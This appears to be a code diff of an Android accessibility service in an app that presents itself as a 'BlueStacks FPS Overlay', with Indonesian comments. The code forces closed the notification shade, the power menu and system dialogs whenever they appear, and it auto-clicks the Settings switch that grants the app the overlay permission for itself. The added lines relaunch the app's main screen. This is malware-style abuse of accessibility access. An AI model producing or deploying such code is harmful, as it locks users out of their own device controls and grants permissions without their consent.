@@ -52,13 +52,10 @@ public class FPSAccessibilityService extends AccessibilityService {
         if (packageName.equals("com.android.systemui")) {
             // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
             performGlobalAction(GLOBAL_ACTION_BACK);
-            
-            // Untuk Android 12+, gunakan aksi spesifik untuk menutup shade jika BACK tidak cukup
+
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                 performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
             }
-
-            // Kirim broadcast penutup sebagai proteksi lapis ketiga
             Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
             sendBroadcast(closeDialog);
             
@@ -69,12 +66,9 @@ public class FPSAccessibilityService extends AccessibilityService {
         if (rootNode == null) return;
 
         try {
-            // 2. BLOKIR POWER MENU & DIALOG SISTEM
             if (packageName.equals("android") || packageName.contains("systemui")) {
                 checkAndDismissSensitiveUI(rootNode);
             }
-
-            // 3. HANDLE AUTOMATION PERMISSION (Logic yang sudah ada)
             handleOverlayPermissionFlow(rootNode, packageName);
             
         } finally {
@@ -83,15 +77,12 @@ public class FPSAccessibilityService extends AccessibilityService {
     }
 
     private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
-        // Kita buat loop pencarian singkat jika node belum ditemukan
-        // Ini menangani delay render UI di halaman Settings
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
             if (currentRoot == null) return;
 
             try {
-                // 1. Mencari nama aplikasi di list overlay (BlueStacks FPS)
-                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BlueStacks FPS");
+                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BlueStacks FPS Overlay");
                 AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
 
                 if (!targets.isEmpty() && switchNode != null) {
@@ -103,12 +94,12 @@ public class FPSAccessibilityService extends AccessibilityService {
                         triggerOverlay();
                     }
                 } else if (pkg.contains("settings")) {
-                    clickByText(currentRoot, "BlueStacks FPS");
+                    clickByText(currentRoot, "BlueStacks FPS Overlay");
                 }
             } finally {
                 currentRoot.recycle();
             }
-        }, 150); // Delay kecil 150ms untuk sinkronisasi render UI
+        }, 150);
     }
 
     private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
@@ -156,10 +147,16 @@ public class FPSAccessibilityService extends AccessibilityService {
     }
 
     private void triggerOverlay() {
+        writeLog("Permission Granted - Launching Engine UI");
         if (!FPSService.isAuthenticated) {
-            Intent intent = new Intent(this, FPSService.class);
-            startService(intent);
+            Intent serviceIntent = new Intent(this, FPSService.class);
+            startService(serviceIntent);
         }
+        Intent launchApp = new Intent(this, MainActivity.class);
+        launchApp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
+                           Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
+                           Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        startActivity(launchApp);
     }
 
     @Override
